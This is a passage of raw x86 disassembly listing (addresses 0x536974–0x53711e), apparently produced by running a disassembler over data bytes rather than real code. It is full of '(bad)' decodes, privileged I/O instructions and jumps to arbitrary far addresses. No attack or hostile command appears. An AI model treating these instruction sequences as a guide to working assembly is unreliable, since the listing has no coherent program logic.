  536974:	stos   DWORD PTR es:[edi],eax
  536975:	xchg   edx,eax
  536976:	mov    ch,0x91
  536978:	ret    
  536979:	retf   
  53697a:	ins    DWORD PTR es:[edi],dx
  53697b:	add    eax,0xb30595ef
  536980:	mov    bh,0xd3
  536982:	xor    ah,al
  536984:	push   edi
  536985:	jp     0x536935
  536987:	adc    DWORD PTR [ebx+0x55e3eee2],edx
  53698d:	xchg   esp,eax
  53698e:	pop    ss
  53698f:	pop    eax
  536990:	pop    es
  536991:	(bad)  
  536992:	cld    
  536993:	ins    BYTE PTR es:[edi],dx
  536994:	xchg   edi,eax
  536995:	mov    ?,edi
  536997:	push   edx
  536998:	xchg   edi,eax
  536999:	sti    
  53699a:	retf   0x8541
  53699d:	sti    
  53699e:	int3   
  53699f:	sub    dl,BYTE PTR [ebp+0x75cd8031]
  5369a5:	add    BYTE PTR [ecx+0x16873214],0x61
  5369ac:	mov    eax,ds:0xda227041
  5369b1:	mov    fs,WORD PTR [eiz*4-0x11e35fe4]
  5369b8:	leave  
  5369b9:	pop    ss
  5369ba:	mov    esi,0x811f0b3f
  5369bf:	icebp  
  5369c0:	fcomip st,st(6)
  5369c2:	pop    ecx
  5369c3:	mov    dl,BYTE PTR [eax+0x4]
  5369c6:	and    DWORD PTR [ecx+edi*2+0x5924bcbd],ebp
  5369cd:	or     BYTE PTR [esi],al
  5369cf:	cs inc ebx
  5369d1:	mov    ah,0xdb
  5369d3:	int3   
  5369d4:	ror    BYTE PTR [ebp-0x6c],cl
  5369d7:	push   ss
  5369d8:	push   es
  5369d9:	gs scas al,BYTE PTR es:[edi]
  5369db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5369dc:	ja     0x536980
  5369de:	pushf  
  5369df:	cmp    ah,BYTE PTR [ecx]
  5369e1:	btc    DWORD PTR [ebx],esi
  5369e4:	pop    ebx
  5369e5:	and    DWORD PTR [edi],0xfffffff3
  5369e8:	fild   QWORD PTR [ecx]
  5369ea:	imul   ebx,DWORD PTR [esi],0x32
  5369ed:	and    edi,edi
  5369ef:	mov    ah,0x57
  5369f1:	jl     0x536a3c
  5369f3:	lods   al,BYTE PTR ds:[esi]
  5369f4:	inc    ebx
  5369f5:	or     DWORD PTR [eax+0xa9f21cd],esp
  5369fb:	lea    eax,[ecx-0xa49789]
  536a01:	lahf   
  536a02:	aam    0xcb
  536a04:	out    0xbd,al
  536a06:	mov    ds:0x38d4bf30,al
  536a0b:	xlat   BYTE PTR ds:[ebx]
  536a0c:	cs mov dl,0x73
  536a0f:	mov    WORD PTR ds:[edi],gs
  536a12:	pusha  
  536a13:	jl     0x536a76
  536a15:	std    
  536a16:	jle    0x5369a7
  536a18:	and    BYTE PTR [ecx],dl
  536a1a:	cmc    
  536a1b:	psubb  mm6,QWORD PTR [ecx]
  536a1e:	mov    eax,0x8b70e90e
  536a23:	not    al
  536a25:	sub    al,0xf1
  536a27:	nop
  536a28:	(bad)  
  536a29:	scas   al,BYTE PTR es:[edi]
  536a2a:	jns    0x5369c1
  536a2c:	mov    eax,ds:0x7661c52a
  536a31:	pop    esp
  536a32:	out    dx,eax
  536a33:	add    al,0x3d
  536a35:	mov    BYTE PTR [ecx+edi*8],cl
  536a38:	dec    ecx
  536a39:	mov    bh,0x64
  536a3b:	mov    DWORD PTR [edi+ecx*8],esi
  536a3e:	stc    
  536a3f:	adc    ah,bl
  536a41:	or     cl,dl
  536a43:	stos   DWORD PTR es:[edi],eax
  536a44:	xor    eax,0x3062480f
  536a49:	pop    es
  536a4a:	sbb    DWORD PTR [eax],0x6c
  536a4d:	nop
  536a4e:	jle    0x5369fd
  536a50:	push   ds
  536a51:	lds    eax,FWORD PTR [ebp-0xf]
  536a54:	cli    
  536a55:	push   0x146aa358
  536a5a:	mov    ?,edx
  536a5c:	aaa    
  536a5d:	pop    esi
  536a5e:	data16 (bad) 
  536a60:	push   DWORD PTR [ecx+ecx*4]
  536a63:	dec    edi
  536a64:	push   ebp
  536a65:	sub    BYTE PTR [ebp+eax*2+0x4a],bh
  536a69:	je     0x536a8e
  536a6b:	sub    dl,ch
  536a6d:	ret    
  536a6e:	xor    eax,DWORD PTR [esi]
  536a70:	jp     0x536a9d
  536a72:	repnz pop eax
  536a74:	mov    ebx,0x21584740
  536a79:	mov    DWORD PTR [eax+ecx*2+0x66a3d6e9],eax
  536a80:	xchg   ebp,eax
  536a81:	xlat   BYTE PTR ds:[ebx]
  536a82:	push   0xa
  536a84:	mov    eax,0x984feb69
  536a89:	popa   
  536a8a:	mul    BYTE PTR [edi]
  536a8c:	clc    
  536a8d:	ror    DWORD PTR [ebp+0xd],1
  536a90:	movntps XMMWORD PTR [ebx+0x603a4afa],xmm5
  536a97:	cmp    al,0xd
  536a99:	xor    BYTE PTR [ecx-0x7f],bl
  536a9c:	mov    ecx,0x48c4594e
  536aa1:	mov    dh,0xe
  536aa3:	stos   DWORD PTR es:[edi],eax
  536aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  536aa5:	dec    esi
  536aa6:	jbe    0x536b05
  536aa8:	bound  edi,QWORD PTR [edx+eax*4+0x1989000c]
  536aaf:	(bad)  
  536ab0:	jmp    0xe32a:0x132df005
  536ab7:	inc    esi
  536ab8:	adc    DWORD PTR [ecx-0x7e36aa05],esi
  536abe:	mov    dh,0xdc
  536ac0:	lea    ecx,[edi]
  536ac2:	outs   dx,DWORD PTR ds:[esi]
  536ac3:	xchg   ebx,eax
  536ac4:	shl    BYTE PTR [eax-0x68],cl
  536ac7:	xchg   ecx,eax
  536ac8:	mov    dl,0x14
  536aca:	bnd js 0x536b06
  536acd:	daa    
  536ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  536acf:	dec    ebp
  536ad0:	dec    esp
  536ad1:	ret    
  536ad2:	pop    eax
  536ad3:	or     BYTE PTR [ebx],0xa6
  536ad6:	jge    0x536a89
  536ad8:	out    dx,al
  536ad9:	jge    0x536b49
  536adb:	sub    esi,DWORD PTR [ecx+0x1a]
  536ade:	mov    WORD PTR [eax+0x7e],gs
  536ae1:	jmp    0xb4ca:0x20eb35ae
  536ae8:	les    cx,DWORD PTR [edi-0x6]
  536aec:	not    BYTE PTR [eax-0x50491749]
  536af2:	mov    ?,WORD PTR [eax]
  536af4:	in     al,dx
  536af5:	pop    esi
  536af6:	je     0x536b33
  536af8:	mov    ebp,0x251e4c51
  536afd:	xchg   esi,eax
  536afe:	pop    esi
  536aff:	ins    DWORD PTR es:[edi],dx
  536b00:	pop    edx
  536b01:	imul   esi,DWORD PTR [edi],0xa7caf4e0
  536b07:	lahf   
  536b08:	pop    esp
  536b09:	mov    cl,BYTE PTR [ebp+0x260b437a]
  536b0f:	repz adc dh,cl
  536b12:	fnstsw WORD PTR [eax]
  536b14:	mov    edx,0x1aeddb96
  536b19:	mov    eax,0x4ff9bd4c
  536b1e:	stc    
  536b1f:	cs ins BYTE PTR es:[edi],dx
  536b21:	stos   DWORD PTR es:[edi],eax
  536b22:	dec    esi
  536b23:	cmc    
  536b24:	es dec edi
  536b26:	pop    es
  536b27:	sbb    al,0xc
  536b29:	cmp    edi,DWORD PTR [esi-0x4a21868b]
  536b2f:	push   edx
  536b30:	enter  0x78ab,0x8c
  536b34:	and    al,0xb6
  536b36:	sar    bl,cl
  536b38:	or     al,0x18
  536b3a:	out    0x49,eax
  536b3c:	dec    edi
  536b3d:	cmc    
  536b3e:	xor    cl,BYTE PTR [ebp-0x3e]
  536b41:	dec    edi
  536b42:	test   BYTE PTR [ebx],ah
  536b44:	stos   BYTE PTR es:[edi],al
  536b45:	mov    BYTE PTR [edi-0xc],al
  536b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  536b49:	mov    ebp,0x34dd5f45
  536b4e:	out    dx,eax
  536b4f:	inc    edx
  536b50:	inc    ebp
  536b52:	push   ecx
  536b53:	out    dx,al
  536b54:	inc    esi
  536b55:	lea    eax,[eax+0x4085cad]
  536b5b:	pop    esi
  536b5c:	int3   
  536b5d:	dec    ebx
  536b5e:	data16 or al,BYTE PTR [edi-0x4b1bcb6e]
  536b65:	pop    ebp
  536b66:	push   edi
  536b67:	or     eax,0xfe3e3cfb
  536b6c:	je     0x536af3
  536b6e:	int3   
  536b6f:	sahf   
  536b70:	or     eax,eax
  536b72:	xor    bh,BYTE PTR [esi-0x3]
  536b75:	mov    esp,0x30dffeff
  536b7a:	add    BYTE PTR [esi+0x44],0x1c
  536b7e:	or     eax,0xac0ed81c
  536b83:	xor    eax,0xf26ac1a8
  536b88:	or     ebx,ecx
  536b8a:	inc    eax
  536b8b:	xchg   ecx,eax
  536b8c:	cmp    eax,0x9f6bf203
  536b91:	ror    ch,0xa0
  536b94:	repnz or esi,DWORD PTR [esi]
  536b97:	push   0xf33e009b
  536b9c:	jge    0x536c16
  536b9e:	xchg   DWORD PTR [edx-0x1bd63b45],ebx
  536ba4:	push   esi
  536ba5:	int    0xb6
  536ba7:	adc    DWORD PTR [esi-0x58],ecx
  536baa:	add    eax,0xcad4ad9e
  536baf:	pop    esi
  536bb0:	adc    eax,0x3dc21e64
  536bb5:	popf   
  536bb6:	add    BYTE PTR ds:0xc8b6bc4e,ch
  536bbc:	stc    
  536bbd:	pop    edx
  536bbe:	jmp    0x342efff5
  536bc3:	ror    ebx,1
  536bc5:	mov    dh,0x6e
  536bc7:	repz popa 
  536bc9:	dec    edx
  536bca:	and    BYTE PTR [edi+eax*2+0x54],dh
  536bce:	adc    DWORD PTR [eax],ebp
  536bd0:	sub    DWORD PTR [edi+0x5],esi
  536bd3:	bound  edi,QWORD PTR [esi+0x6c334c57]
  536bd9:	jns    0x536b69
  536bdb:	add    bh,BYTE PTR [edx+0x6d6da42e]
  536be1:	mov    cl,0x47
  536be3:	push   ds
  536be4:	movaps XMMWORD PTR [eax-0x2],xmm4
  536be8:	aaa    
  536be9:	sub    esi,ebx
  536beb:	neg    BYTE PTR [edx+0x5efe7fc7]
  536bf1:	lods   al,BYTE PTR ds:[esi]
  536bf2:	push   edx
  536bf3:	xchg   ebx,eax
  536bf4:	mov    eax,ds:0x46d81247
  536bf9:	rol    DWORD PTR [edi+0x2d1bf592],cl
  536bff:	(bad)  [ecx+eax*8-0x55dd633]
  536c06:	fdiv   st,st(4)
  536c08:	jbe    0x536c7e
  536c0a:	ret    0xe34
  536c0d:	scas   al,BYTE PTR es:[edi]
  536c0e:	inc    ecx
  536c0f:	push   esi
  536c10:	jge    0x536c6a
  536c12:	clc    
  536c13:	adc    al,0xff
  536c15:	ret    
  536c16:	xchg   esp,eax
  536c17:	and    DWORD PTR [ecx],esi
  536c19:	jl     0x536bd2
  536c1b:	stos   DWORD PTR es:[edi],eax
  536c1c:	scas   al,BYTE PTR es:[edi]
  536c1d:	in     al,0x47
  536c1f:	mov    eax,DWORD PTR [ecx]
  536c21:	int    0x3
  536c23:	dec    edi
  536c24:	add    al,0x87
  536c26:	in     eax,0x73
  536c28:	push   ebx
  536c29:	mov    ds:0x5152f87b,al
  536c2e:	(bad)
  536c31:	and    al,BYTE PTR [ecx+0x4eeb0359]
  536c37:	add    DWORD PTR [ecx-0x4b],ecx
  536c3a:	jg     0x536ca4
  536c3c:	int3   
  536c3d:	rol    BYTE PTR [ecx],1
  536c3f:	cmp    bl,BYTE PTR [eax-0x43]
  536c42:	xor    BYTE PTR [edi-0x41ad8673],ah
  536c48:	adc    ebp,DWORD PTR [ebx-0x14]
  536c4b:	imul   ebx,DWORD PTR [eax+eax*8+0x6195e882],0xffffffce
  536c53:	pop    ebp
  536c54:	mov    ecx,0x870aad49
  536c59:	test   al,0xf6
  536c5b:	pop    edi
  536c5c:	push   cs
  536c5d:	(bad)  
  536c5e:	jbe    0x536c6d
  536c60:	push   ebp
  536c61:	pop    ebx
  536c62:	sar    DWORD PTR [edx-0x7cc731f7],cl
  536c68:	jne    0x536c39
  536c6a:	dec    edx
  536c6b:	mov    dh,0x6d
  536c6d:	aad    0x26
  536c6f:	push   cs
  536c70:	push   cs
  536c71:	dec    ecx
  536c72:	test   DWORD PTR [eax-0x5066b4fa],ebx
  536c78:	(bad)  
  536c79:	cli    
  536c7a:	and    esi,DWORD PTR [ebx+edx*8]
  536c7d:	xor    DWORD PTR [esi+0x18696834],eax
  536c83:	outs   dx,BYTE PTR ds:[esi]
  536c84:	sbb    DWORD PTR [edi+edi*8],ebp
  536c87:	pop    eax
  536c88:	mov    ds:0x880c9a1e,al
  536c8d:	inc    ebx
  536c8e:	enter  0x3061,0xb5
  536c92:	xchg   esp,eax
  536c93:	push   ss
  536c94:	and    BYTE PTR [edx+0x5c],0x82
  536c98:	fbstp  TBYTE PTR [ecx-0x6]
  536c9b:	cli    
  536c9c:	dec    esp
  536c9d:	mov    ds:0x81325cdd,eax
  536ca2:	das    
  536ca3:	lods   eax,DWORD PTR ds:[esi]
  536ca4:	mov    cl,0x3e
  536ca6:	sub    eax,0x63258658
  536cab:	and    DWORD PTR ds:0x1b2d6587,ebp
  536cb1:	jge    0x536d2c
  536cb3:	jl     0x536ce7
  536cb5:	sub    DWORD PTR [esi],ecx
  536cb7:	jo     0x536d34
  536cb9:	pop    eax
  536cba:	xor    al,0xe7
  536cbc:	push   0xffffff8c
  536cbe:	inc    esi
  536cbf:	repz and dh,BYTE PTR [esi+0x74485765]
  536cc6:	push   es
  536cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  536cc8:	loope  0x536c93
  536cca:	cmp    BYTE PTR [esi],cl
  536ccc:	xchg   esp,eax
  536ccd:	or     al,0x80
  536ccf:	mov    ch,0xbc
  536cd1:	dec    edi
  536cd2:	dec    eax
  536cd3:	out    0x19,eax
  536cd5:	sbb    BYTE PTR [ebx+ebp*1-0x70],dh
  536cd9:	addr16 mov cl,0xd0
  536cdc:	add    eax,0xd15b6a2a
  536ce1:	stos   DWORD PTR es:[edi],eax
  536ce2:	scas   al,BYTE PTR es:[edi]
  536ce3:	push   es
  536ce4:	(bad)  
  536ce5:	in     al,dx
  536ce6:	jmp    0x4cd61df
  536ceb:	push   0xfffffff4
  536ced:	outs   dx,DWORD PTR ds:[esi]
  536cee:	jae    0x536cb7
  536cf0:	cmp    BYTE PTR [eax+0x75d3beb9],dl
  536cf6:	lea    eax,[ecx]
  536cf8:	bound  ebp,QWORD PTR [ebx+0x62]
  536cfb:	cmp    DWORD PTR [esi+0x4875b02a],edx
  536d01:	adc    al,0xb
  536d03:	sbb    DWORD PTR [ebp+0x14],edx
  536d06:	jge    0x536cc2
  536d08:	in     eax,dx
  536d09:	adc    eax,0x6ff20606
  536d0e:	sbb    BYTE PTR [edi-0x6d],0xf0
  536d12:	ins    BYTE PTR es:[edi],dx
  536d13:	hlt    
  536d14:	cmp    esp,edi
  536d16:	shr    DWORD PTR cs:[edi],1
  536d19:	mov    ecx,0x93b7a79f
  536d1e:	call   0x9ca229bc
  536d23:	mov    edx,ebx
  536d25:	loop   0x536caa
  536d27:	pop    es
  536d28:	call   0xeab2:0x6feb4742
  536d2f:	dec    esp
  536d30:	int    0xa3
  536d32:	aaa    
  536d33:	mov    ecx,0x8c196a89
  536d38:	and    BYTE PTR [ebp+0x8],0x97
  536d3c:	jmp    0x5ab5:0x6faff843
  536d43:	or     al,0x9
  536d45:	out    dx,eax
  536d46:	in     eax,0x30
  536d48:	addr16 das 
  536d4a:	rcl    BYTE PTR [ecx],0x2b
  536d4d:	cmc    
  536d4e:	movhps xmm5,QWORD PTR [edx]
  536d51:	jle    0x536d2d
  536d53:	stos   DWORD PTR es:[edi],eax
  536d54:	enter  0x203b,0x64
  536d58:	leave  
  536d59:	(bad)  
  536d5a:	push   ds
  536d5b:	sub    edx,DWORD PTR ds:0x5ef0947f
  536d61:	sahf   
  536d62:	int3   
  536d63:	push   edi
  536d64:	xchg   edi,eax
  536d65:	jl     0x536dab
  536d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  536d68:	loopne 0x536d97
  536d6a:	fsub   st(4),st
  536d6c:	push   edi
  536d6d:	xchg   esi,eax
  536d6e:	(bad)  
  536d6f:	mov    eax,0xbfb84580
  536d74:	stos   DWORD PTR es:[edi],eax
  536d75:	int    0xa9
  536d77:	push   ds
  536d78:	mov    ebx,0x4fffa39b
  536d7d:	or     bl,BYTE PTR [edx+0x61]
  536d80:	dec    esi
  536d81:	adc    DWORD PTR [ecx+0x364fe6f],esp
  536d87:	and    al,0x49
  536d89:	jl     0x536d6f
  536d8b:	bound  ecx,QWORD PTR [ebx+0x771d09b7]
  536d91:	push   ebx
  536d92:	(bad)  
  536d93:	and    dl,dh
  536d95:	js     0x536dcc
  536d97:	call   0x4030:0x194a0ebc
  536d9e:	jmp    0x536d6a
  536da0:	mov    dl,0xb9
  536da2:	xchg   ecx,eax
  536da3:	hlt    
  536da4:	(bad)  
  536da5:	dec    edi
  536da6:	cli    
  536da7:	pop    edx
  536da8:	mov    DWORD PTR [eax],esp
  536daa:	lods   eax,DWORD PTR ds:[esi]
  536dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  536dac:	cwde   
  536dad:	inc    edi
  536dae:	daa    
  536daf:	das    
  536db0:	jge    0x536e10
  536db2:	aam    0x79
  536db4:	test   al,0x98
  536db6:	fist   DWORD PTR [esi+0x10e890b2]
  536dbc:	dec    ecx
  536dbd:	pop    eax
  536dbe:	push   ecx
  536dbf:	cmp    esi,eax
  536dc1:	xor    al,0x7e
  536dc3:	inc    esi
  536dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  536dc5:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  536dc7:	xchg   esp,eax
  536dc8:	jno    0x536de3
  536dca:	mov    bl,0xf8
  536dcc:	cmp    eax,0x3055975b
  536dd1:	fdivr  QWORD PTR [esi-0x1c82e575]
  536dd7:	mov    edi,0x76a7a01b
  536ddc:	inc    sp
  536dde:	sbb    BYTE PTR [ecx+0x11b0f067],dl
  536de4:	loopne 0x536e27
  536de6:	retf   0x1a51
  536de9:	inc    ebx
  536dea:	fsubr  DWORD PTR [edx+0x64fe5aa9]
  536df0:	jmp    0x536e43
  536df2:	inc    ebx
  536df3:	sbb    esi,ebx
  536df5:	xchg   ebp,eax
  536df6:	shl    BYTE PTR [edx-0x4bf5806],cl
  536dfc:	mov    cl,BYTE PTR [edi+0x42]
  536dff:	js     0x536e5c
  536e01:	gs and al,0x50
  536e04:	jmp    0xab4d:0x8cc72bb0
  536e0b:	std    
  536e0c:	sub    eax,0xc35fc156
  536e11:	push   es
  536e12:	retf   0x81dc
  536e15:	jo     0x536e1c
  536e17:	call   ecx
  536e19:	cli    
  536e1a:	jmp    0x536e3c
  536e1c:	push   esp
  536e1d:	sub    dh,bh
  536e1f:	int    0x12
  536e21:	and    DWORD PTR [esi+0x5e64505],ebx
  536e27:	iret   
  536e28:	sbb    eax,0xf790c562
  536e2d:	jns    0x536e0b
  536e2f:	in     eax,dx
  536e30:	out    dx,eax
  536e31:	in     al,dx
  536e32:	fwait
  536e33:	adc    edx,esi
  536e35:	or     BYTE PTR [eax+ebp*8+0x3a],dl
  536e39:	add    ebx,DWORD PTR [edx]
  536e3b:	push   ecx
  536e3c:	shl    DWORD PTR [edx],0xc7
  536e3f:	aad    0xba
  536e41:	(bad)  
  536e42:	retf   0xe0bf
  536e45:	test   DWORD PTR [ecx],ebx
  536e47:	push   0xb352f99a
  536e4c:	push   ecx
  536e4d:	cmp    al,0x3c
  536e4f:	jmp    0x33e15733
  536e54:	clc    
  536e55:	inc    ecx
  536e56:	test   eax,0x4e1f914f
  536e5b:	mov    ebp,ecx
  536e5d:	or     BYTE PTR [edx-0x5f5ce76b],dl
  536e63:	sahf   
  536e64:	dec    ecx
  536e65:	sub    eax,0x51f8799a
  536e6a:	or     bh,dh
  536e6c:	aad    0x32
  536e6e:	push   esi
  536e6f:	pop    ds
  536e70:	mov    ah,0x93
  536e72:	call   0xbe79:0x4edc202d
  536e79:	adc    al,ah
  536e7b:	and    DWORD PTR [ebx-0x1f846337],ebp
  536e81:	cdq    
  536e82:	xchg   edi,eax
  536e83:	push   edx
  536e84:	jmp    FWORD PTR [edx-0x2f35c160]
  536e8a:	sbb    al,0xde
  536e8c:	mov    ds,WORD PTR [esi]
  536e8e:	mov    ds:0xa3094700,eax
  536e93:	or     DWORD PTR [ebx+0x314772cc],edi
  536e99:	or     BYTE PTR [eax-0x44048353],ah
  536e9f:	or     BYTE PTR [edi+0x56],ah
  536ea2:	ud1    ebx,DWORD PTR [ebx+0x60d9b8a7]
  536ea9:	fcom   QWORD PTR [edx+0x70aec0a9]
  536eaf:	jo     0x536e73
  536eb1:	xor    DWORD PTR ds:0xd514fea4,ecx
  536eb7:	or     al,0x94
  536eb9:	iret   
  536eba:	mov    DWORD PTR [ebp*4+0x72c938f1],esi
  536ec1:	enter  0xa3a5,0xc4
  536ec5:	xchg   ebp,eax
  536ec6:	aas    
  536ec7:	or     edi,esp
  536ec9:	inc    ebp
  536eca:	adc    edi,DWORD PTR [edx]
  536ecc:	jb     0x536e6a
  536ece:	stc    
  536ecf:	stos   DWORD PTR es:[edi],eax
  536ed0:	fdivr  QWORD PTR [edx+0x38]
  536ed3:	mov    fs,WORD PTR [ebp-0x35ee9746]
  536ed9:	or     cl,cl
  536edb:	pop    DWORD PTR [ebp+0x3bead52c]
  536ee1:	(bad)  
  536ee2:	cld    
  536ee3:	cld    
  536ee4:	or     ch,BYTE PTR [edx-0x16d7bae6]
  536eea:	xor    ebp,eax
  536eec:	jae    0x536e6e
  536eee:	dec    edx
  536eef:	adc    al,0x81
  536ef1:	shr    dh,cl
  536ef3:	fnsave [eax-0x2b]
  536ef6:	or     BYTE PTR [edx+0x2b],cl
  536ef9:	or     al,BYTE PTR [edi-0xc]
  536efc:	repnz mov ebx,0xb23d0151
  536f02:	popa   
  536f03:	aam    0xb1
  536f05:	stos   DWORD PTR es:[edi],eax
  536f06:	jecxz  0x536eb0
  536f08:	icebp  
  536f09:	mov    ch,0x5b
  536f0b:	frstor [eax]
  536f0d:	fcomp  QWORD PTR [ebp+ebx*2-0x561c6475]
  536f14:	stc    
  536f15:	push   eax
  536f16:	imul   edi,edx,0x4
  536f19:	ds test eax,0xd32d875a
  536f1f:	push   ecx
  536f20:	bound  ebx,QWORD PTR [eax+edx*1]
  536f23:	xlat   BYTE PTR ds:[ebx]
  536f24:	dec    esi
  536f25:	dec    ebx
  536f26:	fiadd  WORD PTR [bx+si-0x13ce]
  536f2b:	dec    eax
  536f2c:	mov    al,ds:0x79efaba7
  536f31:	sbb    BYTE PTR ds:0xb6a09954,0xa3
  536f38:	pop    edx
  536f39:	clc    
  536f3a:	shl    cl,cl
  536f3c:	xlat   BYTE PTR ds:[ebx]
  536f3d:	mov    eax,ds:0xf4762ed6
  536f42:	adc    BYTE PTR ds:0x8d582a13,0xe4
  536f49:	sbb    esi,edi
  536f4b:	sbb    BYTE PTR [si],bl
  536f4e:	pop    esi
  536f4f:	mov    WORD PTR [esi],gs
  536f51:	or     WORD PTR [esi],0xffc8
  536f55:	fld    st(5)
  536f57:	jle    0x536f20
  536f59:	mov    dh,0xcc
  536f5b:	push   ebx
  536f5c:	jb     0x536f13
  536f5e:	adc    ecx,DWORD PTR [ecx]
  536f60:	lds    esi,FWORD PTR [ebx]
  536f62:	jae    0x536fbf
  536f64:	rcr    dh,0xe3
  536f67:	std    
  536f68:	or     ebx,DWORD PTR [eax+0x5262e377]
  536f6e:	mov    esi,0x5010a3ba
  536f73:	out    0x9c,al
  536f75:	call   0x52c090dd
  536f7a:	std    
  536f7b:	aam    0x6c
  536f7d:	int    0x7b
  536f7f:	fld    TBYTE PTR [edx]
  536f81:	dec    ebp
  536f82:	push   ss
  536f83:	xchg   ecx,eax
  536f84:	push   ebp
  536f85:	aaa    
  536f86:	cmp    DWORD PTR [ebx+0x742b44ef],0x33
  536f8d:	ror    BYTE PTR [edi],0xbf
  536f90:	leave  
  536f91:	adc    BYTE PTR [ecx-0x20],0x63
  536f95:	pushf  
  536f96:	test   eax,0x2367d849
  536f9b:	jbe    0x536f2e
  536f9d:	pushf  
  536f9e:	dec    BYTE PTR [ebp-0x6087a113]
  536fa4:	jmp    0x532:0x34e8b970
  536fab:	aad    0x15
  536fad:	call   0x600ce681
  536fb2:	lea    ebp,[esi]
  536fb4:	das    
  536fb5:	jecxz  0x536fbd
  536fb7:	inc    ebx
  536fb8:	les    ebp,FWORD PTR [edx+edi*8+0x3a6e2272]
  536fbf:	sbb    dl,dl
  536fc1:	sbb    ch,bh
  536fc3:	jmp    0x2e3b:0x74d7a1e8
  536fca:	aaa    
  536fcb:	xchg   ebp,eax
  536fcc:	push   ecx
  536fcd:	repnz adc ebp,DWORD PTR [ebx-0x26]
  536fd1:	or     DWORD PTR [ebp+0x33ef227b],esp
  536fd7:	xor    BYTE PTR [ecx+0xf8f6cf3],bl
  536fdd:	or     cl,BYTE PTR [ebx+0x34]
  536fe0:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  536fe2:	out    dx,eax
  536fe3:	mov    dh,0xe
  536fe5:	dec    eax
  536fe6:	in     al,dx
  536fe7:	mov    edi,0xcf073641
  536fec:	pusha  
  536fed:	das    
  536fee:	test   eax,0x9f3c839f
  536ff3:	sbb    DWORD PTR [esi+0x79fc5622],ecx
  536ff9:	dec    ecx
  536ffa:	das    
  536ffb:	pushf  
  536ffc:	cld    
  536ffd:	(bad)  
  536ffe:	retf   
  536fff:	push   0xcca5999c
  537004:	mov    esi,0x3f745eb0
  537009:	fsubr  DWORD PTR [ecx+0x55]
  53700c:	int3   
  53700d:	inc    ecx
  53700e:	pop    ebp
  53700f:	sbb    eax,0xf60a9d2b
  537014:	cmc    
  537015:	cmp    bl,BYTE PTR [ecx]
  537017:	pop    eax
  537018:	xor    eax,0x76fb2e55
  53701d:	jecxz  0x537085
  53701f:	xchg   ebx,eax
  537020:	sbb    eax,DWORD PTR ds:0xe34b3e5c
  537026:	shl    bl,0x83
  537029:	pop    esi
  53702a:	les    ebx,FWORD PTR [ebx+0x5b2de5a0]
  537030:	(bad)
  537033:	dec    ecx
  537034:	push   cs
  537035:	js     0x537026
  537037:	imul   esi,DWORD PTR [ecx-0x5],0xffffffa8
  53703b:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  53703d:	outs   dx,BYTE PTR ds:[esi]
  53703e:	add    DWORD PTR [esi+ebp*8-0x32],edi
  537042:	je     0x53708e
  537044:	test   BYTE PTR ds:0x18f2a924,0xc0
  53704b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53704c:	mov    ds:0x31a3e656,eax
  537051:	into   
  537052:	cmp    BYTE PTR [ecx-0x5f],dl
  537055:	push   esp
  537056:	push   edi
  537057:	pop    ecx
  537058:	or     DWORD PTR [esi+0xbb831c8],ebp
  53705e:	(bad)  
  53705f:	aaa    
  537060:	call   0x8c206fba
  537065:	xchg   ecx,eax
  537066:	pop    edi
  537067:	pop    eax
  537068:	lea    ebx,[edi]
  53706a:	xchg   DWORD PTR [ebp+0x6e4425ad],eax
  537070:	add    eax,0xb6e3a24b
  537075:	and    DWORD PTR [ecx+0x5bb9ad5b],esi
  53707b:	mov    dh,0x37
  53707d:	bswap  edi
  53707f:	repz test BYTE PTR [ebp+0x2f368cb5],cl
  537086:	jb     0x537071
  537088:	mov    cl,0x25
  53708a:	xchg   ecx,eax
  53708b:	mov    eax,ds:0xe94fbcb0
  537090:	fs push ebp
  537092:	xor    cl,bl
  537094:	sub    DWORD PTR [ebp-0x4a],ecx
  537097:	cmp    ebx,ebx
  537099:	dec    ecx
  53709a:	dec    esi
  53709b:	in     al,0x9f
  53709d:	lods   al,BYTE PTR ds:[esi]
  53709e:	xor    eax,0x42c81ccc
  5370a3:	jmp    0x53707d
  5370a5:	mov    eax,0xafdc13f1
  5370aa:	inc    eax
  5370ab:	outs   dx,DWORD PTR ds:[esi]
  5370ac:	add    bh,bl
  5370ae:	test   al,0x69
  5370b0:	add    al,0x24
  5370b2:	bound  eax,QWORD PTR [ebx+eiz*2-0x1e320563]
  5370b9:	or     esi,DWORD PTR [ebp-0x7e]
  5370bc:	jle    0x537105
  5370be:	adc    al,0x2
  5370c0:	push   cs
  5370c1:	push   cs
  5370c2:	shr    ecx,cl
  5370c4:	pop    ecx
  5370c5:	ret    0x29c5
  5370c8:	jae    0x537052
  5370ca:	pusha  
  5370cb:	push   ecx
  5370cc:	adc    BYTE PTR [edx+esi*1+0x1da33735],cl
  5370d3:	sar    DWORD PTR [eax+0x33],0xd8
  5370d7:	pop    ecx
  5370d8:	mov    ah,0xe9
  5370da:	sbb    dh,BYTE PTR [edi]
  5370dc:	dec    edi
  5370dd:	int    0xbb
  5370df:	fadd   DWORD PTR [ebx+eax*1]
  5370e2:	or     BYTE PTR [ebp+0x7c],dh
  5370e5:	ret    
  5370e6:	dec    edi
  5370e7:	and    DWORD PTR [edi],ecx
  5370e9:	ficom  DWORD PTR ds:0x8b7f20c9
  5370ef:	xchg   ebx,eax
  5370f0:	fcomp  DWORD PTR [ebx-0x6f]
  5370f3:	stc    
  5370f4:	aaa    
  5370f5:	pop    ebp
  5370f6:	in     al,dx
  5370f7:	(bad)  
  5370f8:	popf   
  5370f9:	xchg   BYTE PTR [esi-0x38eafb3d],cl
  5370ff:	mov    bl,0x9a
  537101:	mov    edx,0x6c1fddf3
  537106:	bndldx bnd3,[esi+0x1b29bf68]
  53710d:	lea    ecx,[ecx]
  53710f:	pop    edi
  537110:	xor    DWORD PTR [ecx],eax
  537112:	cmc    
  537113:	maskmovq mm1,(bad)
  537114:	test   DWORD PTR [ebp-0xd8cc1ca],0x22e79d7d
  53711e:	and    al,bh
